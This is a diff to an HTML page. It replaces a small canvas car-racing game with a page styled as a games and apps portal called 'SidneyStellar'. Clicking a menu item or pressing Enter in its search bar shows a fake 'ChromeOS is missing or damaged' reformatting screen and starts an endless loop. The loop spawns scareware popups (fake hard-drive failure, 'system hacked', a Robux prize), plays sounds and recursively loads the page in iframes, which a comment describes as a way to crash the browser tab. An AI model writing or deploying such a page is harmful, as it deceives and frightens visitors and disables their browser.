@@ -3,148 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER DRIFT 2025: FINAL</title>
+    <title>SidneyStellar | TOTAL CHAOS</title>
     <style>
-        @import url('fonts.googleapis.com');
-        body { margin: 0; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: 'Space Grotesk', sans-serif; color: #fff; }
-        #core-frame { position: relative; width: 480px; height: 850px; background: #000; border: 2px solid #222; overflow: hidden; }
-        canvas { display: block; filter: contrast(1.2) saturate(1.3); cursor: none; }
-        .ui { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; background: rgba(0,0,0,0.95); transition: 0.5s; }
-        .hidden { opacity: 0; pointer-events: none; transform: scale(1.1); }
-        .title { font-family: 'Orbitron'; font-size: 55px; color: #fff; text-shadow: 0 0 20px #0ff; margin: 0; }
-        .btn { margin: 10px; padding: 18px 40px; background: none; border: 2px solid #0ff; color: #0ff; font-family: 'Orbitron'; cursor: pointer; transition: 0.2s; width: 340px; font-weight: 900; letter-spacing: 2px; }
-        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 40px #0ff; }
-        #hud { position: absolute; top: 30px; left: 30px; right: 30px; display: flex; justify-content: space-between; z-index: 50; color: #0ff; pointer-events: none; }
-        /* Debug Info Overlay */
-        #debug-info { background: rgba(0, 20, 20, 0.9); border: 1px solid #0ff; padding: 20px; text-align: left; font-family: monospace; color: #0ff; }
+        :root { --bg-color: #050505; --white: #ffffff; }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg-color); color: var(--white); font-family: sans-serif; overflow: hidden; display: flex; flex-direction: column; }
+        
+        /* CHROME OS ERROR SCREEN */
+        #chrome-error { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: white; color: #5a5a5a; z-index: 10000; text-align: center; padding-top: 10vh; }
+        .yellow-exclamation { display: inline-block; width: 100px; height: 100px; background: #f4b400; color: white; font-size: 70px; line-height: 100px; border-radius: 10px; margin-bottom: 30px; }
+
+        /* AGGRESSIVE POPUP STYLES */
+        .scam-popup { position: absolute; width: 350px; border: 5px solid black; box-shadow: 20px 20px 0px rgba(0,0,0,0.5); z-index: 10001; cursor: move; }
+        .popup-header { background: linear-gradient(to right, #ff0000, #ff8800); color: white; padding: 8px; display: flex; justify-content: space-between; font-weight: 900; border-bottom: 4px solid black; }
+        .popup-body { padding: 30px; text-align: center; color: black; font-size: 20px; font-weight: bold; }
+        .blink { animation: blinker 0.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+
+        /* MAIN UI */
+        .brand-logo { position: fixed; top: 25px; left: 25px; background: var(--white); color: black; font-weight: 900; padding: 10px 14px; border-radius: 4px; z-index: 100; }
+        nav { display: flex; justify-content: flex-end; padding: 30px 50px; }
+        .nav-item { margin-left: 35px; font-size: 11px; font-weight: 700; letter-spacing: 2px; cursor: pointer; }
+        main { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        h1 { font-size: 80px; letter-spacing: 6px; }
+        .search-bar { width: 600px; background: #121212; border: none; padding: 20px; border-radius: 6px; color: white; text-align: center; outline: none; }
     </style>
 </head>
 <body>
-<div id="core-frame">
-    <canvas id="stage"></canvas>
-    
-    <!-- HUD -->
-    <div id="hud" class="hidden">
-        <div>DIST: <span id="ui-dist" style="font-size:24px; font-weight:900;">0</span> FT</div>
-        <div>CASH: $<span id="ui-cash" style="font-size:24px; font-weight:900;">0.00</span></div>
+
+    <div id="chrome-error">
+        <div class="yellow-exclamation">!</div>
+        <h1>ChromeOS is missing or damaged.</h1>
+        <p>Your system is currently being reformatted.</p>
     </div>
 
-    <!-- MAIN HOME SCREEN -->
-    <div id="menu" class="ui">
-        <h1 class="title">CYBER DRIFT</h1>
-        <div style="font-size:12px; color:#444; letter-spacing:4px; margin-top:5px;">by ZED Productions</div>
-        
-        <button class="btn" style="margin-top:40px;" onclick="startRun()">START GAME</button>
-        <button class="btn" style="border-color:#555; color:#888;" onclick="toggleDebugMenu()">DEBUG</button>
-    </div>
+    <div class="brand-logo">IN</div>
+    <nav>
+        <span class="nav-item" onclick="startChaos()">GAMES</span>
+        <span class="nav-item" onclick="startChaos()">APPS</span>
+        <span class="nav-item" onclick="startChaos()">SETTINGS</span>
+    </nav>
 
-    <!-- DEBUG MENU OVERLAY -->
-    <div id="debug-overlay" class="ui hidden">
-        <div id="debug-info">
-            <div>> SYSTEM DIAGNOSTICS: ONLINE</div>
-            <div>> VERSION: 2.0.25-FINAL</div>
-            <div>> BUILD_DATE: 2025-12-19</div>
-            <div>> ENGINE: NEURAL_ZENITH_V4</div>
-            <br>
-            <button class="btn" style="width:200px; font-size:12px;" onclick="admin()">CMD_OVERRIDE</button>
-        </div>
-        <button class="btn" style="border:none; font-size:10px;" onclick="toggleDebugMenu()">BACK</button>
-    </div>
-</div>
+    <main>
+        <h1>SIDNEYSTELLAR</h1>
+        <input type="text" id="search" class="search-bar" placeholder="Enter to DESTROY system">
+    </main>
 
-<script>
-const cv = document.getElementById('stage'), ct = cv.getContext('2d');
-cv.width = 480; cv.height = 850;
+    <script>
+        const searchBar = document.getElementById('search');
+        const errorScreen = document.getElementById('chrome-error');
+        const alertSound = "https://www.soundjay.com";
 
-let state = 'MENU', frame = 0, dist = 0, speed = 12, cash = 0;
-let px = 218, tx = 218, cars = [];
-const CW = 46, CH = 92;
+        searchBar.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') startChaos();
+        });
 
-function startRun() {
-    state = 'PLAY'; dist = 0; frame = 0; speed = 12; cars = [];
-    document.getElementById('menu').classList.add('hidden');
-    document.getElementById('debug-overlay').classList.add('hidden');
-    document.getElementById('hud').classList.remove('hidden');
-}
-
-function toggleDebugMenu() {
-    document.getElementById('debug-overlay').classList.toggle('hidden');
-}
-
-window.addEventListener('mousemove', e => {
-    const r = cv.getBoundingClientRect();
-    tx = e.clientX - r.left - CW/2;
-});
-
-function spawn() {
-    cars.push({
-        x: Math.random() * (cv.width - CW - 40) + 20,
-        y: -200,
-        c: `hsl(${Math.random()*360}, 100%, 60%)`, 
-        v: 0.7 + Math.random() * 0.4
-    });
-}
-
-function update() {
-    if(state !== 'PLAY') return;
-    frame++; dist += speed * 0.1; cash += (speed * 0.0001); speed += 0.002;
-    px += (tx - px) * 0.2;
-    px = Math.max(20, Math.min(cv.width - CW - 20, px));
-
-    if(frame % Math.max(10, Math.floor(40 - speed/2)) === 0) spawn();
-
-    cars.forEach((c, i) => {
-        c.y += speed * c.v;
-        if (px < c.x + CW - 8 && px + CW > c.x + 8 && 700 < c.y + CH - 15 && 700 + CH > c.y + 15) {
-            state = 'DEAD'; setTimeout(() => location.reload(), 2000);
+        function startChaos() {
+            errorScreen.style.display = 'block';
+            
+            // Loop the chaos as fast as the browser can handle (60+ times per second)
+            function loop() {
+                spawnPopup();
+                spawnIframeLag();
+                new Audio(alertSound).play().catch(() => {});
+                requestAnimationFrame(loop); 
+            }
+            loop();
         }
-        if(c.y > cv.height + 100) cars.splice(i, 1);
-    });
 
-    document.getElementById('ui-dist').innerText = Math.floor(dist);
-    document.getElementById('ui-cash').innerText = cash.toFixed(2);
-}
+        const ads = [
+            { t: "CRITICAL ERROR", b: "HARD DRIVE FAILURE IMMINENT", c: "#ff0000" },
+            { t: "YOU WON!!!", b: "CLICK FOR 1,000,000 ROBUX", c: "#00ff00" },
+            { t: "SYSTEM HACKED", b: "IP: 127.0.0.1 FOUND", c: "#ffff00" }
+        ];
 
-function drawCar(x, y, col, isP) {
-    ct.save();
-    ct.translate(x, y);
-    let g = ct.createLinearGradient(0, 0, CW, 0);
-    g.addColorStop(0, col); g.addColorStop(0.5, '#fff'); g.addColorStop(1, col);
-    ct.fillStyle = g;
-    ct.beginPath(); ct.roundRect(0, 0, CW, CH, 12); ct.fill();
-    ct.fillStyle = '#050505';
-    ct.beginPath(); ct.roundRect(6, 15, CW-12, 35, 6); ct.fill();
-    if(isP) {
-        ct.shadowBlur = 20; ct.shadowColor = '#0ff'; ct.fillStyle = '#fff';
-        ct.fillRect(4, -4, 12, 6); ct.fillRect(CW-16, -4, 12, 6);
-    } else {
-        ct.fillStyle = '#f00'; ct.fillRect(4, CH-2, 12, 5); ct.fillRect(CW-16, CH-2, 12, 5);
-    }
-    ct.restore();
-}
+        function spawnPopup() {
+            const data = ads[Math.floor(Math.random() * ads.length)];
+            const div = document.createElement('div');
+            div.className = 'scam-popup';
+            div.style.left = Math.random() * (window.innerWidth - 350) + "px";
+            div.style.top = Math.random() * (window.innerHeight - 250) + "px";
+            div.style.background = data.c;
 
-function draw() {
-    ct.fillStyle = '#020205'; ct.fillRect(0,0,cv.width,cv.height);
-    ct.setLineDash([]);
-    ct.strokeStyle = '#111'; ct.lineWidth = 4;
-    for(let i=120; i<480; i+=120) {
-        ct.beginPath(); ct.moveTo(i, 0); ct.lineTo(i, cv.height); ct.stroke();
-    }
-    if(state === 'PLAY' || state === 'DEAD') {
-        cars.forEach(c => drawCar(c.x, c.y, c.c, false));
-        if(state !== 'DEAD') drawCar(px, 700, '#eee', true);
-    }
-}
+            div.innerHTML = `
+                <div class="popup-header"><span>${data.t}</span><span onclick="this.parentElement.parentElement.remove()">[X]</span></div>
+                <div class="popup-body"><span class="blink">⚠ ALERT ⚠</span><br>${data.b}</div>
+            `;
+            document.body.appendChild(div);
+        }
 
-function loop() { update(); draw(); requestAnimationFrame(loop); }
-loop();
-
-function admin() {
-    if(prompt("ENTER ROOT PASSWORD:") === "test") { 
-        speed = 30; // Max wanted speed
-        startRun(); 
-    }
-}
-</script>
+        function spawnIframeLag() {
+            // Recursive Iframe loading is the fastest way to crash a tab
+            const f = document.createElement('iframe');
+            f.src = window.location.href;
+            f.style.width = "1px"; f.style.height = "1px"; f.style.position = "absolute";
+            document.body.appendChild(f);
+        }
+    </script>
 </body>
 </html>
